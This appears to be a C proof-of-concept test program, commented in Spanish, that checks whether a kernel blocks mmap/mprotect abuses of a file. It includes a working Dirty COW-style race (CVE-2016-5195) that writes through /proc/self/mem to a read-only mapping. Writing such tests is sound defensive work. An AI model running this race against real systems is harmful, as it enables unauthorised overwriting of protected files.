/**
 * @file poc_mmap.c
 * @brief Pruebas de concepto (PoC): intentos de abuso de mmap()/mprotect() sobre un archivo.
 *
 * Uso:  ./poc_mmap <modo> <archivo> [segundos]
 *
 *   leer                 mmap(PROT_READ, MAP_SHARED) y muestra la primera línea.
 *   escribir_compartido  mmap(PROT_READ|PROT_WRITE, MAP_SHARED) y escribe "HACKEADO"
 *                        (si lo logra, el cambio llega al archivo en disco).
 *   escribir_privado     mmap(PROT_READ|PROT_WRITE, MAP_PRIVATE) con fd O_RDONLY y
 *                        escribe "HACKEADO" (Copy-On-Write: el archivo NO cambia).
 *   ejecutar             mmap(PROT_READ|PROT_EXEC) de un archivo sin bit x.
 *   mprotect_escritura   mmap(PROT_READ, MAP_SHARED) y luego mprotect(+PROT_WRITE).
 *   mprotect_ejecucion   mmap(PROT_READ, MAP_PRIVATE) y luego mprotect(+PROT_EXEC).
 *   carrera              ataque de carrera estilo Dirty COW (CVE-2016-5195): un hilo
 *                        hace madvise(MADV_DONTNEED) mientras otro escribe por
 *                        /proc/self/mem sobre un mapeo privado de solo lectura.
 *
 * Código de salida: 0 = la operación peligrosa SE PUDO hacer,
 *                   1 = el kernel la NEGÓ, 2 = error de uso u otro error.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define LARGO 4096   /* se proyecta una página */

static const char *ATAQUE = "HACKEADO";

/** Imprime el resultado de una operación negada y devuelve el código 1. */
static int negado(const char *que)
{
	printf("  -> NEGADO: %s falló con %s (errno=%d)\n", que, strerror(errno), errno);
	return 1;
}

static int abrir(const char *ruta, int flags)
{
	int fd = open(ruta, flags);
	if (fd < 0) {
		printf("  -> open(%s) falló: %s\n", ruta, strerror(errno));
		exit(2);
	}
	return fd;
}

static int modo_leer(const char *ruta)
{
	int fd = abrir(ruta, O_RDONLY);
	char *p = mmap(NULL, LARGO, PROT_READ, MAP_SHARED, fd, 0);
	close(fd);
	if (p == MAP_FAILED)
		return negado("mmap(PROT_READ, MAP_SHARED)");
	printf("  -> PERMITIDO: mmap de lectura en %p. Primera línea: %.*s\n",
	       (void *)p, (int)strcspn(p, "\n"), p);
	munmap(p, LARGO);
	return 0;
}

static int modo_escribir_compartido(const char *ruta)
{
	int fd = abrir(ruta, O_RDWR);
	char *p = mmap(NULL, LARGO, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	close(fd);
	if (p == MAP_FAILED)
		return negado("mmap(PROT_WRITE, MAP_SHARED)");
	memcpy(p, ATAQUE, strlen(ATAQUE));          /* escritura sin syscall */
	msync(p, LARGO, MS_SYNC);                   /* forzar a disco */
	printf("  -> PERMITIDO: se escribió '%s' en el archivo a través de la memoria\n", ATAQUE);
	munmap(p, LARGO);
	return 0;
}

static int modo_escribir_privado(const char *ruta)
{
	int fd = abrir(ruta, O_RDONLY);             /* ¡fd de solo lectura! */
	char *p = mmap(NULL, LARGO, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	close(fd);
	if (p == MAP_FAILED)
		return negado("mmap(PROT_WRITE, MAP_PRIVATE)");
	memcpy(p, ATAQUE, strlen(ATAQUE));          /* fallo de página -> COW */
	printf("  -> PERMITIDO (COW): la copia privada en memoria ahora dice '%.8s';"
	       " el archivo en disco no cambia\n", p);
	munmap(p, LARGO);
	return 0;
}

static int modo_ejecutar(const char *ruta)
{
	int fd = abrir(ruta, O_RDONLY);
	char *p = mmap(NULL, LARGO, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);
	close(fd);
	if (p == MAP_FAILED)
		return negado("mmap(PROT_EXEC)");
	printf("  -> PERMITIDO: el archivo quedó mapeado como CÓDIGO ejecutable en %p\n", (void *)p);
	munmap(p, LARGO);
	return 0;
}

static int modo_mprotect(const char *ruta, int extra, int tipo, int flags_open)
{
	int fd = abrir(ruta, flags_open);
	char *p = mmap(NULL, LARGO, PROT_READ, tipo, fd, 0);
	close(fd);
	if (p == MAP_FAILED)
		return negado("mmap(PROT_READ) inicial");
	printf("  -> paso 1: mmap(PROT_READ) permitido en %p\n", (void *)p);
	if (mprotect(p, LARGO, PROT_READ | extra) != 0) {
		int r = negado(extra == PROT_EXEC ? "mprotect(+PROT_EXEC)" : "mprotect(+PROT_WRITE)");
		munmap(p, LARGO);
		return r;
	}
	if (extra == PROT_WRITE) {
		memcpy(p, ATAQUE, strlen(ATAQUE));
		msync(p, LARGO, MS_SYNC);
		printf("  -> PERMITIDO: mprotect subió el mapeo a escritura y se escribió '%s'\n", ATAQUE);
	} else {
		printf("  -> PERMITIDO: mprotect volvió el mapeo ejecutable\n");
	}
	munmap(p, LARGO);
	return 0;
}

/* ---------------- Ataque de carrera estilo Dirty COW ---------------- */

static char *mapa;
static atomic_int corriendo = 1;   /* bandera compartida entre hilos */
static atomic_long n_madvise, n_escrituras;   /* prueba de que la carrera sí corrió */

static void *hilo_madvise(void *arg)
{
	(void)arg;
	while (corriendo) {
		madvise(mapa, LARGO, MADV_DONTNEED);   /* tira la copia COW una y otra vez */
		n_madvise++;
	}
	return NULL;
}

static void *hilo_escritor(void *arg)
{
	int fd = open("/proc/self/mem", O_RDWR);
	(void)arg;
	if (fd < 0)
		return NULL;
	while (corriendo)                           /* escribe "por la puerta de atrás" */
		if (pwrite(fd, ATAQUE, strlen(ATAQUE), (off_t)(unsigned long)mapa) > 0)
			n_escrituras++;
	close(fd);
	return NULL;
}

static int modo_carrera(const char *ruta, int segundos)
{
	char despues[16] = {0};
	pthread_t h1, h2;
	int fd = abrir(ruta, O_RDONLY);

	mapa = mmap(NULL, LARGO, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mapa == MAP_FAILED) {
		close(fd);
		return negado("mmap(PROT_READ, MAP_PRIVATE) del ataque");
	}
	printf("  -> mapeo privado de solo lectura en %p; corriendo la carrera %d s...\n",
	       (void *)mapa, segundos);
	pthread_create(&h1, NULL, hilo_madvise, NULL);
	pthread_create(&h2, NULL, hilo_escritor, NULL);
	sleep(segundos);
	corriendo = 0;
	pthread_join(h1, NULL);
	pthread_join(h2, NULL);
	munmap(mapa, LARGO);
	printf("  -> carrera ejecutada: %ld madvise(MADV_DONTNEED) y %ld escrituras por /proc/self/mem\n",
	       (long)n_madvise, (long)n_escrituras);

	/* ¿cambió el archivo en disco? Se lee con pread, no por la memoria. */
	if (pread(fd, despues, 8, 0) < 0)
		perror("pread");
	close(fd);
	if (strncmp(despues, ATAQUE, strlen(ATAQUE)) == 0) {
		printf("  -> VULNERABLE: el archivo en disco ahora empieza por '%s'\n", despues);
		return 0;
	}
	printf("  -> RESISTIÓ: el archivo sigue empezando por '%.8s' (la escritura solo tocó la copia COW)\n",
	       despues);
	return 1;
}

int main(int argc, char **argv)
{
	if (argc < 3) {
		fprintf(stderr, "Uso: %s <leer|escribir_compartido|escribir_privado|ejecutar|"
			"mprotect_escritura|mprotect_ejecucion|carrera> <archivo> [segundos]\n", argv[0]);
		return 2;
	}
	const char *modo = argv[1], *ruta = argv[2];

	if (!strcmp(modo, "leer"))                return modo_leer(ruta);
	if (!strcmp(modo, "escribir_compartido")) return modo_escribir_compartido(ruta);
	if (!strcmp(modo, "escribir_privado"))    return modo_escribir_privado(ruta);
	if (!strcmp(modo, "ejecutar"))            return modo_ejecutar(ruta);
	if (!strcmp(modo, "mprotect_escritura"))  return modo_mprotect(ruta, PROT_WRITE, MAP_SHARED, O_RDWR);
	if (!strcmp(modo, "mprotect_ejecucion"))  return modo_mprotect(ruta, PROT_EXEC, MAP_PRIVATE, O_RDONLY);
	if (!strcmp(modo, "carrera"))             return modo_carrera(ruta, argc > 3 ? atoi(argv[3]) : 3);

	fprintf(stderr, "Modo desconocido: %s\n", modo);
	return 2;
}
